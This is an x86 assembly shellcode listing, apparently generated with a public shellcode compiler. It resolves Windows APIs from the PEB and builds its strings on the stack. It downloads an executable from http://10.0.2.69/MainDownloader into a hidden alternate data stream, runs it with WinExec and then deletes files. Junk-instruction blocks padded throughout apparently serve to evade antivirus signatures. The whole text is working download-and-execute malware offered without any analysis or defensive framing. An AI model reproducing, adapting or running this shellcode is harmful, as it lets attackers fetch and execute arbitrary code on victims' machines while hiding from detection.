; Shellcode generated using Shellcode Compiler
; https://github.com/NytroRST/ShellcodeCompiler

xor ecx, ecx
mov eax, [fs:ecx + 0x30]               ; EAX = PEB
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!
mov eax, [fs:ecx + 0x30]               ; EAX = PEB
mov eax, [eax + 0xc]                   ; EAX = PEB->Ldr
mov esi, [eax + 0x14]                  ; ESI = PEB->Ldr.InMemOrder
lodsd                                  ; EAX = Second module
xchg eax, esi                          ; EAX = ESI, ESI = EAX
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!
lodsd                                  ; EAX = Third(kernel32)
mov ebx, [eax + 0x10]                  ; EBX = Base address
mov edx, [ebx + 0x3c]                  ; EDX = DOS->e_lfanew
add edx, ebx                           ; EDX = PE Header
mov edx, [edx + 0x78]                  ; EDX = Offset export table
add edx, ebx                           ; EDX = Export table
mov esi, [edx + 0x20]                  ; ESI = Offset namestable
add esi, ebx                           ; ESI = Names table
xor ecx, ecx                           ; EXC = 0

Get_Function:

inc ecx                                ; Increment the ordinal
lodsd                                  ; Get name offset
add eax, ebx                           ; Get function name
cmp dword [eax], 0x50746547            ; GetP
jnz Get_Function
cmp dword [eax + 0x4], 0x41636f72      ; rocA
jnz Get_Function
cmp dword [eax + 0x8], 0x65726464      ; ddre
jnz Get_Function
mov esi, [edx + 0x24]                  ; ESI = Offset ordinals
add esi, ebx                           ; ESI = Ordinals table
mov cx, [esi + ecx * 2]                ; Number of function
dec ecx
mov esi, [edx + 0x1c]                  ; Offset address table
add esi, ebx                           ; ESI = Address table
mov edx, [esi + ecx * 4]               ; EDX = Pointer(offset)
add edx, ebx                           ; EDX = GetProcAddress

mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!

xor ecx, ecx                           ; ECX = 0
push ebx                               ; Kernel32 base address
push edx                               ; GetProcAddress
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!
push ecx                               ; 0
push 0x41797261                        ; aryA
push 0x7262694c                        ; Libr
push 0x64616f4c                        ; Load
push esp                               ; LoadLibrary
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!
push ebx                               ; Kernel32 base address
call edx                               ; GetProcAddress(LL)

add esp, 0xc                           ; pop LoadLibrary
pop ecx                                ; ECX = 0
push eax                               ; EAX = LoadLibrary

mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!

xor eax, eax
mov ax, 0x6c6c
push eax
push 0x642e6e6f
push 0x6d6c7275
push esp                               ; String on the stack
call [esp + 16]
add esp, 12
push eax                               ; DLL base on the stack

xor eax, eax
mov ax, 0x4165
push eax
push 0x6c69466f
push 0x5464616f
push 0x6c6e776f
push 0x444c5255
push esp                               ; String on the stack
push dword [esp + 24]
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!
call [esp + 36]
add esp, 20
push eax                               ; Function address on the stack

xor eax, eax
mov eax, 0x23636578
push eax
sub dword [esp + 3], 0x23
push 0x456e6957
push esp                               ; String on the stack
push dword [esp + 28]
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!
call [esp + 28]
add esp, 8
push eax                               ; Function address on the stack

xor eax, eax
mov eax, 0x2341656c
push eax
sub dword [esp + 3], 0x23
push 0x69466574
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!
push 0x656c6544
push esp                               ; String on the stack
push dword [esp + 36]
call [esp + 36]
add esp, 12
push eax                               ; Function address on the stack

xor eax, eax
mov eax, 0x23726564
push eax
sub dword [esp + 3], 0x23
push 0x616f6c6e
push 0x776f446e
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!
push 0x69614d2f
push 0x39362e32
push 0x2e302e30
push 0x312f2f3a
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!
push 0x70747468
push esp

xor eax, eax
mov al, 0x72
push eax
push 0x6564616f
push 0x6c6e776f
push 0x643a6578
push 0x652e7265
push 0x64616f6c
push 0x6e776f44
push 0x6e69614d
push esp

xor eax, eax
push eax
xor eax, eax
push eax
push dword [ESP + 8]
push dword [ESP + 48]
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!
xor eax, eax
push eax
call [ESP + 100]
add ESP, 72
xor eax, eax
mov al, 0x72
push eax
push 0x6564616f
push 0x6c6e776f
push 0x643a6578
push 0x652e7265
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!
push 0x64616f6c
push 0x6e776f44
push 0x6e69614d
push esp

xor eax, eax
push eax
push dword [ESP + 4]
call [ESP + 48]
add ESP, 36
xor eax, eax
mov al, 0x72
push eax
push 0x6564616f
push 0x6c6e776f
push 0x643a6578
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!
push 0x652e7265
push 0x64616f6c
push 0x6e776f44
push 0x6e69614d
push esp

push dword [ESP + 0]
call [ESP + 40]
add ESP, 36
xor eax, eax
mov ax, 0x6578
push eax
push 0x652e7265
push 0x64616f6c
push 0x6e776f44
push 0x6e69614d
push esp

push dword [ESP + 0]
call [ESP + 28]
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!
add ESP, 24
